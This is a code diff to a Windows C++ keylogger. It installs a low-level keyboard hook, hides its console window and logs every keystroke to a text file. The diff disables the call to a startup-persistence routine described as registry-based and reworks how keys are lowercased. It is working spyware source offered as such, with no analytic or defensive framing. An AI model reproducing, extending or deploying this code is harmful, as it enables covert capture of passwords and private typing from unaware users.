@@ -1,19 +1,19 @@
-#define PATH "KeyLogger_OUTFILE.txt" // path to keylogger output file location
+#define PATH "KeyLogger_OUTFILE.txt" // path to keylogger OUTPUT file location
 #include <iostream>
 #include <Windows.h>
 #include <string>
 #include <fstream>
-void hide();
-void show();
+void hide(); 
+void show(); 
 bool saveToFile(DWORD key);
-bool addToStartup(); // starts keylogger at startup
+bool addToStartup(); // starts keylogger at startup by adding it to the registry
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam); // keyboard hook production
 HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, NULL);
 
 int main()
 {
 	hide();
-	addToStartup();
+	
 	MSG Msg;
 	while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
 	{
@@ -30,7 +30,7 @@ bool saveToFile(DWORD key)
 	else if (key == VK_ESCAPE)
 	{
 		UnhookWindowsHookEx(keyboardHook);
-		fprintf(OUTPUT_FILE, "%s", "\nEXIT PRESSED");
+		fprintf(OUTPUT_FILE, "%s", "\nEXIT PRESSED\n");
 		fclose(OUTPUT_FILE);
 		exit(1);
 	}
@@ -102,7 +102,11 @@ bool saveToFile(DWORD key)
 	else if (key == VK_F12)
 		fprintf(OUTPUT_FILE, "%s", " [F12]");
 	else
+	{
+		if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0) // to check if the key is an uppercase letter
+			key = tolower(key);
 		fprintf(OUTPUT_FILE, "%s", &key);
+	}
 	fclose(OUTPUT_FILE);
 	return true;
 }
@@ -127,11 +131,7 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 	// nCode - represented as 0 or HC_ACTION if a key was pressed, otherwise any number below 0
 	PKBDLLHOOKSTRUCT kbs = (PKBDLLHOOKSTRUCT)lParam;
 	if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
-	{
-		if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0)
-			kbs->vkCode = tolower(kbs->vkCode);
 		saveToFile(kbs->vkCode);
-	}
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 static void hide()
